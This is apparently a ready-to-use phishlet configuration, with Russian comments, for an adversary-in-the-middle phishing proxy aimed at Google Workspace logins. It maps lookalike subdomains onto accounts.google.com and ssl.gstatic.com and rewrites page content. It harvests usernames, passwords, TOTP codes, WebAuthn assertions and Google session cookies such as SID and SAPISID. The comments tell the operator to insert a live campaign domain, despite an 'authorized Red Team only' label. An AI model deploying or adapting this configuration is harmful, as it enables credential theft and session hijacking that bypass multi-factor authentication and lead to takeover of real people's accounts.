# Google Workspace phishlet (Phantom v2). Только авторизованный Red Team.
# Перед боем: base_domains -> свой домен, прогнать живой логин (identifier -> challenge -> Passwd/passkey).
# Сессионные cookie соответствуют публичной анатомии Google-сессий.
id: google
version: 2
base_domains:
  - "phish.test" # REPLACE-ME: боевой домен кампании
proxy_hosts:
  - phish_sub: "gacc"
    orig_sub: "accounts"
    domain: "google.com"
    is_landing: true
  - phish_sub: "gstatic"
    orig_sub: "ssl"
    domain: "gstatic.com"
    is_landing: false
sub_filters:
  - triggers_on: "accounts.google.com"
    search: "accounts.google.com"
    replace: "gacc.phish.test"
    mime: ["text/html", "application/json"]
    redirect_only: false
  - triggers_on: "ssl.gstatic.com"
    search: "ssl.gstatic.com"
    replace: "gstatic.phish.test"
    mime: ["text/html", "text/css", "application/json", "javascript"]
    redirect_only: false
auth_tokens:
  - domain: ".google.com"
    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "OSID", "NID"]
creds_map:
  - key: "login"
    search: "identifier"
  - key: "passwd"
    search: "Passwd"
  - key: "passwd"
    search: "password"
mfa_tokens:
  - key: "totp"
    search: "totp"
  - key: "webauthn"
    search: "authenticatorAssertionResponse"
lure_path: "/l/google-01"
enabled: true
